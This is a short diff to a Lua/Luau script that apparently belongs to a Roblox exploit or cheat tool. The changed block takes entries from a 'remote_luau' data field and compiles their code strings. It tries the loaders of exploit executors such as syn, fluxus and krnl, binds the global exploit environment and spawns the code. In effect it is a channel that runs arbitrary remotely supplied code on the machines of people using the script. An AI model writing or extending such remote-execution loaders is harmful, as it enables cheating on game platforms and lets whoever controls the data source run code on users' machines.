@@ -484,14 +484,29 @@ end)
 end
 if data.remote_luau and type(data.remote_luau)=="table" then
 for _,item in ipairs(data.remote_luau) do
-local cid=item.id or item.code
+local cid=tostring(item.id or item.code)
 if not _seen_execs[cid] then
 _seen_execs[cid]=true
 local code_str=item.code or ""
 if code_str~="" then
 _spawn(function()
-local fn,err=loadstring(code_str)
-if fn then pcall(fn) end
+local _load=loadstring or (syn and syn.loadstring) or (fluxus and fluxus.loadstring) or (krnl and krnl.loadstring) or load
+if _load then
+local fn,err=_load(code_str)
+if fn then
+pcall(function()
+local env=(getgenv and getgenv()) or getfenv(0)
+if setfenv then setfenv(fn,env) end
+end)
+if task and task.spawn then
+task.spawn(fn)
+elseif spawn then
+spawn(fn)
+else
+pcall(fn)
+end
+end
+end
 end)
 end
 end
